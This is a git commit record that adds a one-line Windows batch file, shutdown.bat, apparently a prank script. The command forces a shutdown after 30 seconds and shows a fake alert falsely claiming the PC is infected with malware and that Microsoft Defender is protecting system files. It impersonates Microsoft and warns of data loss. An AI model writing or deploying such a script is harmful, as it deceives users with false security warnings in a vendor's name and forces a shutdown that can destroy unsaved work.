8268b07278a62f1da3385cd16638a0637e698a65
SkibidiSigmaMale69 <ellisthomas8421@gmail.com>
2024-07-26 12:50:08 +0100

    Add files via upload

---
+++ shutdown.bat
@@ -0,0 +1,1 @@
+shutdown -s -t 30 -c "Your PC has been infected with malicious software. In an attempt to stop the spread of the virus Windows will shut down in 30 seconds so that Microsoft Defender will protect system files e.g. SYSTEM32. You might lose some data because of this but Microsft will prioritise system files".
